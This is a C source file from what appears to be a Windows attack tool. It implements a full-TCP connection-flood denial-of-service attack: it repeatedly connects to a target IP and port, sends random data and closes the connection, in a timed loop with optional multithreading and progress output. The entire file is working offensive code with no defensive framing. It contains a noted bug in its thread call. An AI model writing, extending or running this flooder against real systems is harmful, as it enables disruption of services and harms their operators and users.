#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iphlpapi.h>   // IPAddr

#include "Network.h"
#include "Message.h"
#include "AttackDOS.h"


#define DEFAULT_BUFLEN 512

int HttpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
    SOCKET SendingSocket;
    char* payloadBuffer = NULL;

    //SendingSocket = socket(AF_INET, SOCK_DGRAM , IPPROTO_TCP);
    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (SendingSocket == INVALID_SOCKET) {
        PrintSocketError("Client: socket() failed! Error code");
        return FALSE;
    }
    int iResult = connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
    if (iResult != 0) {
        PrintSocketError("Connect() failed! Error code");
        closesocket(SendingSocket);
        return FALSE;
    }

    if (!CopyRandBufferAlloc(&payloadBuffer, bufferSize))
        return FALSE;


    // Send an initial buffer
    iResult = send(SendingSocket, payloadBuffer, (int)bufferSize, 0);
    if (iResult == SOCKET_ERROR) {
        PrintSocketError("Send failed with error");
        PrintSocketError("send failed with error");
        closesocket(SendingSocket);
        return FALSE;
    }
    //printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
    closesocket(SendingSocket);
    return iResult;
}

typedef struct {
    SOCKADDR_IN ServerAddr;
    char* ipAddress;
    UINT bufferSize;
}THREAD_STRUCT_HTTP_DOS, * PTHREAD_STRUCT_HTTP_DOS;

DWORD WINAPI ThreadHttpDosConnection(LPVOID lpParam) {
    PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
    SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
    char* ipAddress = pThreadData->ipAddress;
    UINT bufferSize = pThreadData->bufferSize;
    return HttpDosConnection(ServerAddr, ipAddress, bufferSize);
}

BOOL AttackFloodFullTcp(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
    clock_t startTime = clock();
    clock_t currentTime = clock();
    SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
    THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
        .ServerAddr = ssin,
        .ipAddress = ipAddress,
        .bufferSize = bufferSize
    };
    int sizeDataSize = 0;

    printf("[-] Attack Flooding with FULL TCP connection\n");

    for (int i = 0; startTime + waitTime > currentTime; i++) {
        DWORD ThreadId = 0;
        if (isMultith) {
            // ERROR ???

            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HttpDosConnection, &threadStructHttpDos, 0, &ThreadId);
            if (Thread != NULL) {
                PrintMsgError2("Create Thread with id: %lu\n", ThreadId);
                CloseHandle(Thread);
            }
        } else {
            sizeDataSize += HttpDosConnection(ssin, ipAddress, bufferSize);
            printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
        }
        currentTime = clock();
    }
    printf("\n[!] Attack done !\n");
    return sizeDataSize;
}